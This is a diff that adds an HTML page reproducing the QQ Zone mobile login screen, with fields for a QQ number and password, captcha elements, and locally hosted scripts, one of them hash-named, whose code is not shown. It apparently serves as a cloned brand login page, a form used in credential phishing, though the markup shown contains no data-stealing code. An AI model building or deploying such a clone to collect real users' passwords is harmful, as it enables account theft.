@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta id="viewport" name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>手机统一登录</title>
+    <!-- tips -->
+    <script type="text/javascript" src="js/tips.js"></script>
+    <!-- end tips -->
+</head>
+
+<body>
+    <link rel="stylesheet" href="css/login.css">
+    <!--顶部banner-->
+    <!--引导页-->
+    <div id="guide" class="dl-guide" style="display:none;">
+        <!-- wifi类来切换,3G/2G默认没该类 -->
+        <header class="" id="guideBG">
+            <h1>QQ空间手机版</h1>
+            <p class="intro">更省流量、极速传图、个性背景
+                <br>访客提醒、权限设置</p>
+            <b class="cover"></b>
+        </header>
+        <p class="action">
+            <b id="guideJump" class="item blue">打开QQ空间手机版</b>
+            <b id="guideSkip" class="item">继续访问触屏版</b>
+        </p>
+    </div>
+    <!-- guide show -->
+    <script type="text/javascript" src="js/guide.js"></script>
+    <!-- end guide show -->
+    <div id="content" class="content">
+        <div id="error_tips">
+            <div id="error_tips_content"><span id="error_icon"></span> <span id="error_message">您还没有输入密码！</span></div>
+        </div>
+        <div id="login" class="login">
+            <div id="logo" class="logo"></div>
+            <div id="app_name" style="display:none"></div>
+            <div id="q_login" class="q_login" style="display: none">
+                <div id="q_login_title">
+                    <div id="q_login_logo"></div>
+                    <label id="q_login_tips"> 请选择登录帐号 </label>
+                </div>
+                <div id="q_logon_list" class="q_logon_list"></div>
+            </div>
+            <div id="web_login">
+                <ul id="g_list">
+                    <li id="g_u">
+                        <div id="del_touch" class="del_touch"><span id="del_u" class="del_u"></span></div>
+                        <input id="u" class="inputstyle" name="u" autocomplete="off" placeholder="QQ号码/手机/邮箱">
+                    </li>
+                    <li id="g_p">
+                        <div id="del_touch_p" class="del_touch"><span id="del_p" class="del_u"></span></div>
+                        <input id="p" class="inputstyle" maxlength="16" type="password" name="p" autocorrect="off" placeholder="请输入您的QQ密码">
+                    </li>
+                </ul>
+                <div href="javascript:void(0);" id="go" onclick="l()">登 录</div>
+                <div href="javascript:void(0);" id="onekey"> 一键登录 </div>
+            </div>
+            <div id="switch">
+                <div id="swicth_login" onclick="pt._switch();" style="display: none"> 快速登录历史帐号 </div>
+                <div id="zc_feedback"> <span id="zc" onclick="window.open('https\x3A\x2F\x2Fssl.ptlogin2.qq.com\x2Fj_newreg_url')">注册新帐号</span> <span id="forgetpwd">忘了密码？</span> </div>
+            </div>
+            <div id="custom_bottom"> </div>
+        </div>
+        <div id="vcode">
+            <label id="vcode_tips"> 点击图片可更换验证码 </label>
+            <div id="vcode_area"><img id="vcode_img">
+                <label id="input_tips"> 请输入图中的字符不区分大小写 </label>
+                <input id="vcode_input" name="vcode_input" tabindex="3" ; autocomplete="off" autocorrect="off" maxlength="6">
+            </div>
+            <div id="submit"> 提交验证码 </div>
+        </div>
+    </div>
+    <div id="new_vcode" class="new_vcode">
+        <iframe id="cap_iframe" src="" frameborder="0" scrolling="auto" width="100%" height="100%"></iframe>
+    </div>
+    <div id="footerBlank"></div>
+</body>
+<script type="text/javascript" src="js/login.js"></script>
+<!-- quick login -->
+<script type="text/javascript" src="js/quick.js"></script>
+<!-- end quick login -->
+<script src="js/59eac4c0c1b24c51b0a41e5c38a95704.js" charset="UTF-8"></script>
+</html>
